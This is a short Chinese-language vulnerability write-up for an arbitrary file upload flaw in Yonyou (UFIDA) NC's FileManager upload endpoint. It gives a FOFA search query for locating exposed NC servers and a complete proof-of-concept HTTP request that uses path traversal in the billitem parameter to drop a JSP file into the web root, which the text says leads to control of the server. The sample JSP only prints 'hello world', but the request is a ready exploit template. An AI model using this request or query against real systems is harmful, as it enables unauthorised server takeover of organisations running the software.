# 用友NC系统FileManager接口存在任意文件上传漏洞

NC系统可利用/portal/pt/file/upload 接口中的 filename 参数及 billitem 参数实现任意文件上传，从而控制服务器

## fofa

```yaml
app="用友-UFIDA-NC"
```

## poc

```java
POST /portal/pt/file/upload?pageId=login&filemanager=nc.uap.lfw.file.FileManager&iscover=true&billitem=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cwebapps%5Cnc_web%5C HTTP/1.1
Host:
Content-Type: multipart/form-data;boundary=d0b7a0d40eed0e32904c8017b09eb305

--d0b7a0d40eed0e32904c8017b09eb305
Content-Disposition: form-data; name="file"; filename="we.jsp" 
Content-Type: text/plain

<%out.print("hello world");%>
--d0b7a0d40eed0e32904c8017b09eb305--
```

